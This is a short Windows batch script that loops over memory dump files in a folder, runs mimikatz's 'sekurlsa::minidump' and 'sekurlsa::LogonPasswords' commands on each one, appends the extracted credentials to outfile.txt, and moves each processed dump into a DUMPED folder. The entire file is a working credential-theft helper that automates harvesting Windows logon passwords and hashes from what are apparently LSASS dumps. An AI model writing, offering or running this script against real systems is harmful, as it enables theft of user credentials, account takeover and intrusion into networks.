IF EXIST "DUMPED" (
	for %%f in (*.dmp) do (
		mimikatz.exe "sekurlsa::minidump %%f" "sekurlsa::LogonPasswords" "exit" >> outfile.txt
		move %%f DUMPED
	)
	pause
) ELSE (
	mkdir DUMPED
	for %%f in (*.dmp) do (
		mimikatz.exe "sekurlsa::minidump %%f" "sekurlsa::LogonPasswords" "exit" >> outfile.txt
		move %%f DUMPED
	)
	pause
)